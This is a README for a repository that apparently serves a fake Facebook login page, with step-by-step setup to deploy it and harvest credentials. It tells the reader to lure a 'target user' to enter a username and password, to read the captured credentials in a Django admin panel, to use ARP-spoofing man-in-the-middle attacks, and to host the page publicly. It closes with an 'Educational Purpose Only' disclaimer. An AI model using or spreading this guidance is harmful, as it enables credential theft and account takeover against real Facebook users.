# Welcome To Phishing FaceBook
## Required Python2 or Python3

Download Links: 
* https://www.python.org/ftp/python/3.6.1/python-3.6.1-amd64.exe (for Windows User)
* https://www.python.org/ftp/python/2.7.13/python-2.7.13.amd64.msi (for Windows User)
* https://git-scm.com/download/win (Download Git)

# Installation
* Install Python from given links(Add Environment Vars if needed).
* Install Python Django 
```
command > python -m pip install Django==1.8.9
```
* Install Python Requests 
```
command > python -m pip install requests
```


# Download Repo (Commands)
* command > git clone https://github.com/IAmBlackHacker/Facebook-phishing
* command > cd Facebook-phishing

# Make Backened (Commands)
* command\Facebook-phishing > python manage.py makemigrations
* command\Facebook-phishing > python manage.py migrate
* command\Facebook-phishing > python manage.py createsuperuser (this for creating admin username and password)

# Run Server (Commands)
* command\Facebook-phishing > python manage.py runserver 0.0.0.0:8080

# Target User
* Open Link <Your IP> EX. 127.0.0.1:8080
* Enter Facebook Username and Password
  
# Look for Password
* Open <Your IP>:<Port>/admin in browser Ex. 127.0.0.1:8080/admin

# Admin Usernam:Password
* root:root

# Tricks to Hack Password Easily
* use MITM (Arp Spoofing)

# Free Hosting
* https://codecondo.com/5-platforms-provide-free-django-app-hosting/

# Reports Bugs and Feedback
* https://m.me/B14CKH4K3R

```
Happy Hacking Day :) Educational Purpose Only ....
```
